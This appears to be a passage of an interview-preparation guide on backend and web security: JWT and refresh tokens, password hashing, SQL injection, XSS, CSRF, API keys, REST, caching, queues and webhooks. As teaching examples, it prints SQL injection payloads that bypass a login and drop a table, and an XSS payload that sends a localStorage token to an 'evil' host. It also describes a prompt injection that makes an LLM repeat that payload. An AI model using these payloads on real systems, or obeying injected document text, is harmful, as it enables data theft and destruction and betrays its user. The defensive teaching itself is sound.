+<x-simple>Flow: credentials → server verifies → server signs a token with the user id and expiry → client stores it → client sends <code>Authorization: Bearer &lt;token&gt;</code> → middleware verifies signature and expiry (no DB) → <code>req.user</code> is set → handlers authorize using req.user.id → when it expires, refresh or log in again. Revocation and logout need extra state (short expiry + refresh tokens, or a denylist).</x-simple>
+<x-eg>See the “JWT login and an authorized request” animation in lesson 3.B.</x-eg>
+<x-fu q="What happens if the signing secret leaks?">Anyone can mint valid tokens for any user. Rotate the secret (all tokens become invalid), investigate, and consider asymmetric keys with key ids (kid) to rotate gracefully.</x-fu>
+<x-no>Storing the password or roles that change often in the token.</x-no>
+<x-ev>Flow understanding.</x-ev></x-q>
+
+<x-q n="3.41" tag="must solid"><x-t>What are access tokens and refresh tokens?</x-t>
+<x-say>Access tokens are short-lived credentials sent with every request. Refresh tokens are long-lived, stored more safely, used only to get new access tokens, and can be revoked server-side. Together they give short exposure if a token leaks plus long sessions.</x-say>
+<x-simple>The access token is presented on every request, so it’s more exposed (logs, XSS, proxies) and is kept short-lived (minutes). The refresh token is presented only to one endpoint, lives longer (days/weeks), is stored server-side (hashed) so it can be revoked, and is rotated on every use so a stolen one is detected when both the attacker and the user try to use it. Logout = revoke the refresh token.</x-simple>
+<x-eg>The access/refresh code in lesson 3.B: <code>DELETE … RETURNING</code> makes each refresh token single-use.</x-eg>
+<x-dm>DocMind has access tokens only (7/30 days). Adding refresh tokens is on the known-gaps list.</x-dm>
+
+<x-fu q="What is refresh token reuse detection?">If a refresh token that was already rotated is presented again, someone copied it: revoke the whole token family and force re-login.</x-fu>
+<x-no>“Refresh tokens are just longer access tokens.”</x-no>
+<x-ev>Session design.</x-ev></x-q>
+
+<x-q n="3.42" tag="must solid"><x-t>Where should tokens be stored?</x-t>
+<x-say>Trade-off. An httpOnly, Secure, SameSite cookie can’t be read by JavaScript (protects against XSS theft) but needs CSRF protection and works best on the same site. localStorage or memory is simple for cross-site APIs but readable by any XSS. A common pattern: access token in memory, refresh token in an httpOnly cookie.</x-say>
+<x-eg>SPA on the same site as the API: access token in memory + refresh token in an httpOnly SameSite=Strict cookie. Mobile app: the OS secure storage (Keychain/Keystore).</x-eg>
+<x-dm>DocMind chose localStorage because Vercel and Render are different sites (an API cookie would be third-party), and compensated by rendering answers with no raw HTML.</x-dm>
+
+<x-fu q="Why not localStorage for everything?">Any XSS on the page can read localStorage and exfiltrate the token; an httpOnly cookie can’t be read by script (though XSS can still make requests while the page is open).</x-fu>
+<x-no>“httpOnly cookies make XSS harmless.” They prevent theft of the token, not actions taken through the page.</x-no>
+<x-ev>Security trade-offs.</x-ev></x-q>
+
+<x-q n="3.43" tag="must basic"><x-t>What happens when an access token expires?</x-t>
+<x-say>verify() throws TokenExpiredError, the API returns 401, and the client either calls the refresh endpoint and retries the request once, or sends the user to log in.</x-say>
+<x-simple>Verification fails with an expiry error (jsonwebtoken throws <code>TokenExpiredError</code>). The API answers 401. A good client intercepts 401s once: calls the refresh endpoint, stores the new access token, retries the original request; if refresh fails, it clears state and shows login. Concurrent 401s should share one refresh call (a single in-flight promise) to avoid races with rotating refresh tokens.</x-simple>
+<x-eg>DocMind’s frontend ignores a 401 whose token isn’t the current one, so a late failure from an old request can’t log out a freshly signed-in user.</x-eg>
+
+<x-fu q="Should the server give a different message for expired vs invalid tokens?">It can use a machine-readable code (e.g. <code>token_expired</code>) so the client knows to refresh, while keeping messages generic.</x-fu>
+<x-no>“The server automatically refreshes the token.”</x-no>
+<x-ev>Flow handling.</x-ev></x-q>
+
+<x-q n="3.44" tag="must solid"><x-t>How would you implement role-based access control?</x-t>
+<x-say>Store roles (or permissions) per user, load them on the request (token claim or DB lookup), and check them in middleware or the service: <code>requireRole('admin')</code>. Combine with ownership checks for row-level access.</x-say>
+<x-code><pre data-l="js">const requireRole = (...roles) => (req, res, next) =>
+  roles.includes(req.user.role) ? next() : next(new HttpError(403, 'Forbidden'));
+app.delete('/admin/users/:id', requireAuth, requireRole('admin'), deleteUser);</pre></x-code>
+<x-fu q="Role in the token or in the DB?">In the token is fast but stale until expiry; in the DB is fresh but costs a lookup. Short-lived tokens make the token approach acceptable.</x-fu>
+
+<x-no>Checking roles only in the frontend, or hardcoding <code>if (user.email === 'admin@x.com')</code>.</x-no>
+<x-ev>Authorization design.</x-ev></x-q>
+
+<x-q n="3.45" tag="must basic"><x-t>What is password hashing?</x-t>
+<x-say>Running the password through a one-way, slow, salted function (bcrypt, scrypt, Argon2) and storing only the result. At login you hash the attempt the same way and compare.</x-say>
+<x-simple>A password hash function is one-way and deliberately slow. A random <b>salt</b> per user is mixed in so identical passwords produce different hashes and precomputed tables (rainbow tables) are useless. The <b>cost factor</b> makes each guess take tens of milliseconds, which is nothing for one login but makes billions of guesses against a leaked database impractical. Good choices: Argon2id, scrypt, bcrypt. Fast hashes like SHA-256 are wrong for passwords.</x-simple>
+<x-eg><code>bcrypt.hash('hunter2', 10)</code> → <code>$2b$10$&lt;22-char salt&gt;&lt;31-char hash&gt;</code>: algorithm, cost and salt are stored inside the string, so <code>compare</code> needs nothing else.</x-eg>
+<x-fu q="Why not SHA-256 with a salt?">It’s designed to be fast: GPUs compute billions per second, so leaked salted SHA-256 hashes of common passwords fall quickly.</x-fu>
+<x-no>“Encrypt passwords so you can email them back.”</x-no>
+<x-ev>Basics.</x-ev></x-q>
+
+<x-q n="3.46" tag="must basic"><x-t>Why should passwords never be stored as plain text?</x-t>
+<x-say>A database leak would expose every password, and people reuse passwords across sites. Even staff with DB access shouldn’t be able to read them.</x-say>
+<x-simple>Databases leak through SQL injection, backups, logs, misconfigured buckets and insiders. Plaintext passwords would compromise every user immediately, and because people reuse passwords, also their email and bank accounts. Hashing means even a full leak reveals only slow-to-crack hashes; it also limits what insiders can see. Many laws and standards (and basic trust) require it.</x-simple>
+<x-eg>Breaches of plaintext password stores have led to large-scale credential-stuffing attacks on other sites.</x-eg>
+<x-fu q="What else protects users if hashes leak?">Breached-password checks at signup, MFA, rate-limited logins and alerting.</x-fu>
+<x-no>“Our database is private, so plaintext is fine.”</x-no>
+<x-ev>Responsibility.</x-ev></x-q>
+
+<x-q n="3.47" tag="must basic"><x-t>What’s the difference between hashing and encryption?</x-t>
+<x-say>Hashing is one-way: you can’t get the input back, only compare. Encryption is two-way: with the key you can decrypt. Passwords are hashed; data you need to read again (API keys of your users, tokens to third parties) is encrypted.</x-say>
+<x-simple>Hashing maps input to a fixed-size digest with no key and no way back; you verify by hashing again and comparing. Encryption uses a key to transform data so it can be decrypted with the (same or paired) key. Use hashing for passwords and integrity checks (file hashes for dedupe), HMAC (a keyed hash) for signatures like webhooks and JWT HS256, and encryption for data you must read later (OAuth tokens to third parties, user-provided API keys, PII at rest).</x-simple>
+<x-eg>DocMind could detect duplicate uploads with SHA-256 of the bytes (hash), sign JWTs with HMAC-SHA256 (keyed hash), and would need encryption (e.g. AES-GCM) if it stored users’ own API keys.</x-eg>
+<x-fu q="What is encoding, then?">A reversible format change with no secret (base64, UTF-8). It provides no security.</x-fu>
+<x-no>“Base64 is encryption.”</x-no>
+<x-ev>Precision.</x-ev></x-q>
+
+<x-q n="3.48" tag="must basic"><x-t>What is bcrypt?</x-t>
+<x-say>A password hashing function with a built-in random salt and a cost factor that makes each hash deliberately slow (e.g. 10 rounds ≈ tens of milliseconds), so brute-forcing leaked hashes is expensive.</x-say>
+<x-eg>Cost 10 → about 2^10 rounds; each +1 doubles the time. Pick the highest cost that keeps login under ~100–250 ms on your server.</x-eg>
+<x-fu q="Any limits?">It only uses the first 72 bytes of the password, so cap passwords at 72 bytes (DocMind does). Use the async API so hashing runs on the thread pool, not the event loop.</x-fu>
+
+<x-fu q="bcrypt or Argon2?">Argon2id is the modern recommendation (memory-hard, resists GPUs better); bcrypt is still acceptable and widely available. Use a vetted library either way.</x-fu>
+<x-no>Using the synchronous API in request handlers.</x-no>
+<x-ev>Practical security.</x-ev></x-q>
+
+<x-q n="3.49" tag="must basic"><x-t>What is SQL injection?</x-t>
+<x-say>An attack where user input is concatenated into a SQL string and changes the query’s meaning, e.g. <code>' OR '1'='1</code> to bypass a login or <code>'; DROP TABLE users; --</code>.</x-say>
+<x-simple>SQL injection happens when user-controlled text becomes part of the SQL syntax. The database can’t tell which parts the developer intended. Consequences range from reading other users’ data (<code>' OR 1=1 --</code>) to modifying or deleting tables, and sometimes running OS commands through DB features. It applies to any concatenated query, including ORDER BY, LIKE patterns and raw ORM fragments.</x-simple>
+<x-code><pre data-l="js">// vulnerable
+pool.query(`SELECT * FROM users WHERE email = '${email}'`);
+// safe
+pool.query('SELECT * FROM users WHERE email = $1', [email]);</pre></x-code>
+<x-fu q="Can ORMs still be vulnerable?">Yes, when you use raw SQL helpers with string interpolation (e.g. building <code>sql.raw()</code> from input) or dynamic column names from the client.</x-fu>
+<x-no>“Escaping quotes manually is enough.”</x-no>
+<x-ev>Security basics.</x-ev></x-q>
+
+<x-q n="3.50" tag="must basic"><x-t>How do parameterized queries prevent SQL injection?</x-t>
+<x-say>The SQL text and the values are sent separately. The database parses the query structure first, then binds values as data, so a value can never become SQL syntax.</x-say>
+<x-eg><code>SELECT * FROM users WHERE email = $1</code> with <code>["x' OR '1'='1"]</code>: Postgres looks for a user whose email is literally that string and finds none.</x-eg>
+<x-fu q="What can’t be parameterized?">Identifiers like table or column names and ORDER BY direction. Use an allow-list for those.</x-fu>
+<x-fu q="How do you safely allow a client-chosen sort column?">Map allowed values to known identifiers in code: <code>const col = { created: 'created_at', title: 'title' }[req.query.sort] ?? 'created_at'</code>.</x-fu>
+<x-no>“Parameterized queries are slower.” They’re usually equal or faster (plan caching).</x-no>
+<x-ev>Mechanism, not just the rule.</x-ev></x-q>
+
+<x-q n="3.51" tag="must basic"><x-t>What is XSS?</x-t>
+<x-say>Cross-site scripting: an attacker gets their script to run in other users’ browsers on your site, usually by storing or reflecting unescaped input in HTML. It can steal tokens from localStorage and act as the user.</x-say>
+<x-simple><p>Defences: escape output (React does by default), never inject raw HTML (no <code>dangerouslySetInnerHTML</code> / rehype-raw without a sanitizer like DOMPurify), Content-Security-Policy, httpOnly cookies. LLM output is user-controlled content too: a prompt injection can make the model emit a script tag.</p></x-simple>
+<x-eg>A chat app renders the model’s answer with <code>innerHTML</code>; a document contains “&lt;img src=x onerror=fetch('https://evil?t='+localStorage.token)&gt;”; prompt injection makes the model repeat it; the user’s token is stolen.</x-eg>
+<x-code><pre data-l="js">// render untrusted HTML only after sanitising (browser)
+import DOMPurify from 'dompurify';
+container.innerHTML = DOMPurify.sanitize(markdownToHtml(answer));
+// or better: render markdown as React elements without raw HTML (react-markdown without rehype-raw)</pre></x-code>
+<x-fu q="What is a Content-Security-Policy?">A response header telling the browser which script sources may run (e.g. no inline scripts, only your domain), so injected scripts are blocked even if HTML gets through.</x-fu>
+<x-no>“React makes XSS impossible.” <code>dangerouslySetInnerHTML</code>, <code>href="javascript:…"</code> and raw-HTML markdown plugins bypass it.</x-no>
+<x-ev>Web security.</x-ev></x-q>
+
+<x-q n="3.52" tag="must basic"><x-t>What is CSRF?</x-t>
+<x-say>Cross-site request forgery: a malicious site makes the user’s browser send a request to your site, and the browser automatically attaches your cookies, so the request is authenticated without the user meaning it.</x-say>
+<x-simple><p>Defences: SameSite cookies (Lax/Strict), CSRF tokens, checking Origin. Bearer tokens in headers aren’t sent automatically, so header-token APIs are naturally CSRF-resistant (but more XSS-exposed).</p></x-simple>
+<x-eg>A logged-in bank user visits evil.com, which auto-submits a form to bank.com/transfer; the browser attaches bank.com’s session cookie, and the transfer goes through.</x-eg>
+<x-fu q="Does a JSON API with SameSite=Lax cookies need CSRF tokens?">Lax blocks cookies on cross-site POSTs from forms and fetch, which covers most cases; sensitive apps still add CSRF tokens or check the Origin header, and avoid state-changing GET routes.</x-fu>
+<x-no>“HTTPS prevents CSRF.”</x-no>
+<x-ev>Web security.</x-ev></x-q>
+
+<x-q n="3.53" tag="must basic"><x-t>How would you securely handle API keys?</x-t>
+<x-say>Keep them server-side in environment variables or a secret manager, never in code or Git, send them in headers rather than URLs, give each environment its own key with least privilege, and rotate on exposure.</x-say>
+<x-simple>Secrets belong in the environment or a secret manager (AWS Secrets Manager, GCP Secret Manager, Vault, Doppler), injected at runtime, never in source, images, client bundles or logs. Use separate keys per environment and per service, least-privilege scopes, rotation (and the ability to rotate quickly), and alerts on unusual usage. Prevent leaks with .gitignore, pre-commit secret scanning, and log redaction.</x-simple>
+<x-eg>DocMind: keys only in .env (gitignored) and Render’s dashboard; the Gemini key moved from the URL to the <code>x-goog-api-key</code> header; <code>.history/</code> (VS Code local history) is gitignored after it once leaked a key.</x-eg>
+<x-dm>DocMind moved the Gemini key from <code>?key=</code> in the URL to the <code>x-goog-api-key</code> header, because URLs end up in logs and error messages. A key once leaked through VS Code’s <code>.history</code> folder, so <code>.history/</code> is gitignored now.</x-dm>
+<x-fu q="A key was committed to a public repo. What do you do?">Revoke/rotate it immediately (assume it’s already scraped), check usage logs, then remove it from history; deleting the commit alone isn’t enough.</x-fu>
+<x-no>“Put it in an environment variable in the frontend build.” It ends up in the bundle.</x-no>
+<x-ev>Operational security.</x-ev></x-q>
+
+<x-q n="3.54" tag="must basic"><x-t>Why shouldn’t API keys be exposed in frontend code?</x-t>
+<x-say>Everything shipped to the browser is public: anyone can open dev tools and copy the key, then use your quota and run up your bill. Call the provider from your backend (or a proxy like a Cloudflare Worker) and authenticate users there.</x-say>
+<x-simple>Anything shipped to the browser (JS bundles, environment variables baked at build time like <code>VITE_*</code>, network requests) can be read by any user. A provider key there lets anyone call the provider on your bill, bypass your rate limits and content rules, and possibly access other data the key allows. The backend must hold the key and expose only narrow, authenticated, rate-limited endpoints.</x-simple>
+<x-eg>Cinegraph calls Gemini through a Cloudflare Worker so the key never reaches the browser.</x-eg>
+<x-fu q="Is obfuscating the key in the bundle enough?">No: it’s still sent in network requests visible in dev tools.</x-fu>
+<x-no>“Restricting the key by HTTP referrer makes it safe.” Referrers are easy to fake outside a browser.</x-no>
+<x-ev>Basic security.</x-ev></x-q>
+
+<h2 class="sec"><span class="k">3.4</span>Backend architecture</h2>
+
+<x-q n="3.55" tag="must basic"><x-t>What is REST?</x-t>
+<x-say>An architectural style for HTTP APIs: resources identified by URLs, manipulated with standard methods, stateless requests, standard status codes and representations like JSON.</x-say>
+<x-simple>REST models an API as resources (nouns) with URLs, manipulated through a uniform interface of HTTP methods with standard semantics (safe, idempotent), stateless requests (each carries its own auth and context), representations (JSON) and status codes; responses can be cacheable. In practice “RESTful” means predictable URLs, correct methods and status codes, and consistent error and pagination formats.</x-simple>
+<x-eg><code>GET /documents</code>, <code>POST /documents</code>, <code>GET /documents/:id</code>, <code>PATCH /documents/:id</code>, <code>DELETE /documents/:id</code>, <code>GET /documents/:id/chunks</code>.</x-eg>
+<x-fu q="How do you model an action that isn’t CRUD, like “generate quiz”?">As creating a resource (<code>POST /quizzes</code> → 202 with a quiz id) or a sub-resource action (<code>POST /documents/:id/quiz</code>); either is fine if consistent.</x-fu>
+<x-no>Verbs in URLs for everything (<code>/getDocuments</code>), or 200 with an error in the body.</x-no>
+<x-ev>Basics.</x-ev></x-q>
+
+<x-q n="3.56" tag="must basic"><x-t>What are HTTP methods?</x-t>
+<x-say>GET reads, POST creates or triggers actions, PUT replaces, PATCH partially updates, DELETE removes; HEAD and OPTIONS are metadata. GET, HEAD, PUT and DELETE are idempotent; POST and PATCH aren’t guaranteed to be.</x-say>
+<x-simple>Safe methods (GET, HEAD, OPTIONS) must not change state, so they can be cached, prefetched and retried freely. Idempotent methods (GET, HEAD, PUT, DELETE, OPTIONS) give the same end state when repeated, so clients and proxies may retry them after a timeout. POST (create/act) and PATCH (partial change) are not guaranteed idempotent, so retries need idempotency keys.</x-simple>
+<x-eg>A proxy retrying a timed-out <code>DELETE /documents/5</code> is harmless; retrying <code>POST /payments</code> without a key double-charges.</x-eg>
+<x-fu q="Is DELETE idempotent if the second call returns 404?">Yes: idempotency is about server state (still deleted), not identical responses.</x-fu>
+<x-no>“POST is for sending data, GET for reading” with no idea of safety/idempotency.</x-no>
+<x-ev>Basics.</x-ev></x-q>
+
+<x-q n="3.57" tag="must basic"><x-t>Explain HTTP status codes: 200, 201, 400, 401, 403, 404, 409, 429 and 500.</x-t>
+<x-say>200 OK; 201 Created; 400 bad input; 401 not authenticated; 403 authenticated but not allowed; 404 not found; 409 conflict with current state; 429 too many requests; 500 server bug.</x-say>
+<x-simple>2xx success: 200 OK (with body), 201 Created (new resource; often a Location header), 202 Accepted (queued), 204 No Content. 4xx client errors: 400 malformed/invalid input, 401 missing/invalid credentials, 403 authenticated but not allowed, 404 not found (or hidden), 409 conflicts with current state (duplicate, wrong status), 422 semantically invalid (some APIs use it for validation), 429 rate limited (with Retry-After). 5xx server errors: 500 bug, 502 bad upstream response, 503 temporarily unavailable, 504 upstream timeout.</x-simple>
+<x-code><pre data-l="js">const statusFor = (err) =&gt;
+  err instanceof ValidationError ? 400 :
+  err instanceof UnauthenticatedError ? 401 :
+  err instanceof ForbiddenError ? 403 :
+  err instanceof NotFoundError ? 404 :
+  err instanceof ConflictError ? 409 :
+  err instanceof RateLimitedError ? 429 :
+  err instanceof UpstreamBusyError ? 503 : 500;</pre></x-code>
+<x-dm>DocMind uses 202 Accepted for uploads (queued), 409 for chatting with a document that’s still processing, 503 when Redis is down at upload time, 413 for an oversize file, and 404 (not 403) for another user’s document.</x-dm>
+<x-fu q="401 vs 403?">401: we don’t know who you are (send credentials). 403: we know who you are, and you can’t do this.</x-fu>
+<x-no>Returning 200 with <code>{ error }</code>, or 500 for bad input.</x-no>
+<x-ev>API design vocabulary.</x-ev></x-q>
+
+<x-q n="3.58" tag="must basic"><x-t>What’s the difference between PUT and PATCH?</x-t>
+<x-say>PUT replaces the whole resource with the body (missing fields are cleared) and is idempotent. PATCH changes only the given fields.</x-say>
+<x-simple>PUT sends the complete new representation: the server replaces the resource, so fields you omit are reset or removed, and repeating the same PUT yields the same state (idempotent). PATCH sends only changes (a JSON merge patch <code>{ "title": "x" }</code> or a JSON Patch list of operations); it’s idempotent only if the operations are (setting a field is; “increment views” isn’t).</x-simple>
+<x-eg><code>PUT /profiles/me { name, bio, avatar }</code> vs <code>PATCH /profiles/me { bio }</code>.</x-eg>
+<x-fu q="Which would you use for a settings form that edits one field?">PATCH, so concurrent edits to other fields aren’t overwritten with stale values.</x-fu>
+<x-no>“PATCH and PUT are the same.”</x-no>
+<x-ev>Precision.</x-ev></x-q>
+
+<x-q n="3.59" tag="must basic"><x-t>What is idempotency?</x-t>
+<x-say>An operation is idempotent if doing it once or many times leaves the system in the same state. DELETE /docs/1 twice → still deleted. POST /payments twice → two payments, unless you add an idempotency key.</x-say>
+<x-simple>Formally f(f(x)) = f(x). In APIs: repeating the same request leaves the server in the same state as doing it once, although responses may differ. It matters because networks fail ambiguously: a client that timed out doesn’t know whether the server acted, and the only safe retry is an idempotent one. Techniques: natural idempotency (PUT, DELETE, “set status = ready”), idempotency keys for creates, unique constraints, and upserts.</x-simple>
+<x-eg>“Mark document ready” is idempotent; “append a chunk” isn’t, unless the chunk has a unique (document_id, chunk_index).</x-eg>
+<x-fu q="Is GET always idempotent in practice?">It should be; a GET that changes state (e.g. /logout or /delete?id=) breaks caches, prefetchers and crawlers.</x-fu>
+<x-no>“Idempotent means it returns the same response.”</x-no>
+<x-ev>Reliability concept.</x-ev></x-q>
+
+<x-q n="3.60" tag="must solid"><x-t>Why is idempotency important in payment APIs and AI workflows?</x-t>
+<x-say>Retries are unavoidable (timeouts, crashes, double clicks). In payments a duplicate charges twice; in AI workflows a duplicate spends tokens again and saves duplicate modules or lessons. Idempotency makes retries safe.</x-say>
+<x-simple>Payments: the cost of a duplicate is direct money loss and trust; providers like Stripe accept an <code>Idempotency-Key</code> header and replay the original result. AI workflows: steps are slow, retried often (429s, crashes, recovery) and cost tokens; a duplicated step creates duplicate content, double charges for tokens, and can send duplicate emails or webhooks. Idempotency turns “at-least-once” execution, which queues and workflow engines give you, into “effectively once”.</x-simple>
+<x-eg>A course workflow re-runs lesson 7 after a crash; <code>ON CONFLICT (course_id, module_no, lesson_no) DO NOTHING</code> plus a “skip if exists” check means no duplicate lesson and no second LLM call.</x-eg>
+<x-fu q="What’s “exactly-once delivery”?">Practically impossible across a network; systems deliver at-least-once and make processing idempotent.</x-fu>
+<x-no>“Retries are rare, so it doesn’t matter.”</x-no>
+<x-ev>Applied reliability.</x-ev></x-q>
+
+<x-q n="3.61" tag="should basic"><x-t>What is API versioning?</x-t>
+<x-say>Keeping old clients working while the API changes, via a version in the path (/v1), a header, or by only making additive changes. Breaking changes go to a new version with a deprecation period.</x-say>
+<x-simple>Options: URL path (<code>/v1/documents</code>): explicit and easy to route; header or media type (<code>Accept: application/vnd.app.v2+json</code>): cleaner URLs, harder to test; query parameter. Most important is the policy: additive changes (new optional fields, new endpoints, new event types) don’t need a new version; removing/renaming fields or changing meaning does, with a deprecation period, docs and monitoring of old-version traffic.</x-simple>
+<x-eg>Clients must ignore unknown fields/events for additive changes to be safe; DocMind’s SSE client has no default case, so old bundles skip new events.</x-eg>
+<x-dm>DocMind’s new SSE events (status, sources, action) were additive; old frontends skip unknown events, so no version bump was needed.</x-dm>
+<x-fu q="How do you deprecate v1?">Announce a date, add Deprecation/Sunset headers, track who still calls it, contact them, then remove.</x-fu>
+<x-no>Bumping the version on every change.</x-no>
+<x-ev>Change management.</x-ev></x-q>
+
+<x-q n="3.62" tag="must basic"><x-t>What is caching?</x-t>
+<x-say>Storing the result of expensive work so the next request is served faster: in memory, in Redis, in HTTP caches/CDNs. The hard part is invalidation and staleness.</x-say>
+<x-simple>Caching trades freshness for speed and cost. Patterns: cache-aside (read cache, on miss load from DB and store with a TTL), write-through (update cache when writing), and HTTP caching (Cache-Control, ETag). Hard parts: invalidation (delete or update the key when data changes), stampedes (many misses at once; use locks or request coalescing), and scoping keys by user/tenant so one user never sees another’s cached data.</x-simple>
+<x-eg>Cache document lists for a few seconds; cache embeddings of identical text; cache LLM answers for identical prompts (exact cache) or similar ones (semantic cache, Phase 15).</x-eg>
+<x-code><pre data-l="js">async function getDocumentList(userId) {
+  const key = `docs:${userId}:v1`;
+  const hit = await redis.get(key);
+  if (hit) return JSON.parse(hit);
+  const docs = await repo.listDocuments(userId);
+  await redis.set(key, JSON.stringify(docs), 'EX', 30);   // 30 s TTL
+  return docs;
+}
+async function onDocumentChanged(userId) { await redis.del(`docs:${userId}:v1`); }   // invalidate on write</pre></x-code>
+<x-fu q="What should never be cached?">Anything without the user/tenant in the key when it’s user-specific, and data that must be strongly consistent (balances, permissions) unless invalidation is exact.</x-fu>
+<x-ev>Performance.</x-ev></x-q>
+
+<x-q n="3.63" tag="must basic"><x-t>What is Redis, and when would you use it?</x-t>
+<x-say>An in-memory key-value store with data structures (strings, hashes, lists, sorted sets, streams). Use it for caching, rate-limit counters, sessions, job queues (BullMQ), locks and pub/sub.</x-say>
+<x-simple>Redis keeps data in memory (optionally persisted), so reads and writes take well under a millisecond, and it offers atomic operations on rich structures: INCR for counters, EXPIRE for TTLs, sorted sets for leaderboards and delayed jobs, lists/streams for queues, SET NX for locks, pub/sub for fan-out. It’s single-threaded for command execution, so each command is atomic. Trade-offs: memory cost, data size limited by RAM, and persistence/consistency guarantees weaker than a database.</x-simple>
+<x-eg>Rate-limit counter: <code>INCR rl:user42:202611111430</code> + <code>EXPIRE 60</code>; BullMQ stores waiting/active/delayed jobs in lists and sorted sets.</x-eg>
+<x-dm>DocMind uses Upstash Redis only for BullMQ. Free tier is 500K commands/month; an idle BullMQ worker polls Redis, so it was tuned (drainDelay 30 s, stalledInterval 5 min) from ~34K to ~5.5K commands per day.</x-dm>
+<x-fu q="Why must eviction be off for a BullMQ Redis?">If Redis evicts keys under memory pressure, jobs disappear silently. Queue data must not be evictable (Upstash setup in DocMind has eviction off).</x-fu>
+<x-no>“Redis replaces the database.”</x-no>
+<x-ev>Tool judgement.</x-ev></x-q>
+
+<x-q n="3.64" tag="must basic"><x-t>What is a message queue?</x-t>
+<x-say>A buffer between producers and consumers: producers add messages/jobs, workers take them and process them at their own pace, with acknowledgements and retries. It decouples and smooths load.</x-say>
+<x-simple>Producers add messages without waiting for processing; the broker stores them; consumers pull or receive them, process, and acknowledge. Unacknowledged messages are redelivered (at-least-once), failed ones retried with backoff and eventually moved to a dead-letter queue. Benefits: decoupling, absorbing traffic spikes, retrying failures, scaling consumers independently. Examples: BullMQ (Redis), RabbitMQ, SQS, Kafka (a log, also for event streaming).</x-simple>
+<x-code><pre data-l="js">// BullMQ: producer (API) and consumer (worker)
+import { Queue, Worker } from 'bullmq';
+const connection = { url: process.env.REDIS_URL };
+export const ingestQueue = new Queue('ingest', { connection });
+await ingestQueue.add('embed', { documentId }, { jobId: documentId, attempts: 3, backoff: { type: 'exponential', delay: 5000 } });
+
+new Worker('ingest', async (job) =&gt; {
+  await embedAndStore(job.data.documentId);          // must be idempotent
+}, { connection, concurrency: 2 });</pre></x-code>
+<x-fu q="Queue vs pub/sub?">A queue gives each message to one consumer (work distribution); pub/sub gives each message to every subscriber (fan-out notifications).</x-fu>
+<x-no>“Messages are processed exactly once.”</x-no>
+<x-ev>Architecture basics.</x-ev></x-q>
+
+<x-q n="3.65" tag="must basic"><x-t>What are background jobs?</x-t>
+<x-say>Work done outside the request-response cycle by workers: sending emails, processing uploads, embedding documents, generating reports. The request records the job and returns quickly.</x-say>
+<x-simple>A background job is a unit of work recorded now and executed later or elsewhere: by a worker process reading a queue, a scheduler (cron), or a workflow engine. The request returns immediately with an id or status. Jobs need: idempotency, retries with backoff, timeouts, visibility (status, progress, errors), and a way to handle permanent failures.</x-simple>
+<x-eg>DocMind’s ingest job: chunk texts in, embeddings + status out; 3 attempts; failed status with a reason after the last attempt.</x-eg>
+<x-fu q="How does the user learn the job finished?">Polling a status endpoint, SSE/WebSocket push, email/notification, or a webhook to another system.</x-fu>
+<x-no>“Use setTimeout in the request handler.” It dies with the process and has no retries.</x-no>
+<x-ev>Basics.</x-ev></x-q>
+
+<x-q n="3.66" tag="must solid"><x-t>Why should long-running operations not necessarily execute inside an HTTP request?</x-t>
+<x-say>Requests time out (proxies often at 30–100 s), the user can’t leave the page, a crash loses the work, and long requests tie up connections. A job queue gives retries, progress tracking and horizontal scaling.</x-say>
+<x-eg>Embedding a 200-chunk PDF one call per chunk at ~300 ms each is about 60 s: longer than many proxy timeouts, and a deploy mid-request loses the work. Queued, the upload answers 202 in ~2 s.</x-eg>
+<x-dm>DocMind’s upload went from waiting for every embedding call to returning 202 in ~2 s, with ready in ~5 s.</x-dm>
+<x-fu q="When is doing it inline fine?">When it’s fast (under a second or two), cheap to repeat, and the user needs the result immediately.</x-fu>
+<x-no>“Just increase the request timeout.”</x-no>
+<x-ev>Architecture judgement.</x-ev></x-q>
+
+<x-q n="3.67" tag="must basic"><x-t>What is a webhook?</x-t>
+<x-say>An HTTP request another service sends to your endpoint when an event happens (payment succeeded, file processed). You verify its signature, respond quickly, and process it idempotently because it may be delivered more than once.</x-say>
+<x-simple>Webhooks invert polling: the provider calls you. Because anyone can call your URL, you must verify authenticity, usually an HMAC signature of the raw body with a shared secret plus a timestamp to block replays. Respond 2xx within a few seconds (providers time out and retry), so enqueue the actual work. Deliveries can arrive more than once and out of order, so dedupe by event id and check current state rather than assuming order.</x-simple>
+<x-code><pre data-l="js">import crypto from 'node:crypto';
+app.post('/webhooks/payments', express.raw({ type: 'application/json' }), async (req, res) =&gt; {
+  const sig = req.get('x-signature') ?? '';
+  const ts = Number(req.get('x-timestamp'));
+  if (!ts || Math.abs(Date.now() / 1000 - ts) &gt; 300) return res.sendStatus(400);       // replay window
+  const expected = crypto.createHmac('sha256', process.env.WEBHOOK_SECRET).update(`${ts}.${req.body}`).digest('hex');
+  const ok = sig.length === expected.length &amp;&amp; crypto.timingSafeEqual(Buffer.from(sig), Buffer.from(expected));
+  if (!ok) return res.sendStatus(401);
+  const event = JSON.parse(req.body);
+  const { rowCount } = await pool.query('INSERT INTO webhook_events (id) VALUES ($1) ON CONFLICT DO NOTHING', [event.id]);
+  if (rowCount) await queue.add('payment-event', event, { jobId: event.id });          // first delivery only
+  res.sendStatus(200);
+});</pre></x-code>
+<x-fu q="Why timingSafeEqual?">A normal string comparison stops at the first different byte, so response timing can leak how much of a forged signature is correct.</x-fu>
+<x-no>Parsing the body as JSON before verifying (the signature is over the raw bytes), or doing slow work before responding.</x-no>
+<x-ev>Integration basics.</x-ev></x-q>
+
+<x-q n="3.68" tag="must solid"><x-t>How would you design a retry mechanism?</x-t>
+<x-say>Retry only transient errors (timeouts, 429, 5xx), with a max attempt count, exponential backoff with jitter, a total time budget, and Retry-After respected; make the operation idempotent; log every attempt; give up with a clear error.</x-say>
+<x-simple><p>Implementation: Phase 11 exercise 3 (runnable).</p></x-simple>
+<x-eg>An LLM client: attempts 3, base 500 ms, factor 2, full jitter, cap 8 s, total budget 20 s, retry on timeout/429/5xx, honour Retry-After, log each attempt with the request id.</x-eg>
+<x-fu q="Where should retries live: client, server, or both?">In one well-chosen layer per call path. Retrying in the browser, the API and the SDK at once multiplies attempts (3×3×3 = 27).</x-fu>
+<x-no>Retrying forever, or retrying immediately in a tight loop.</x-no>
+<x-ev>Reliability design.</x-ev></x-q>
+
+<x-q n="3.69" tag="must basic"><x-t>What is exponential backoff?</x-t>
+<x-say>Waiting longer after each failure: e.g. 0.5 s, 1 s, 2 s, 4 s, usually capped and with random jitter, so a struggling service gets room to recover and clients don’t retry in sync.</x-say>
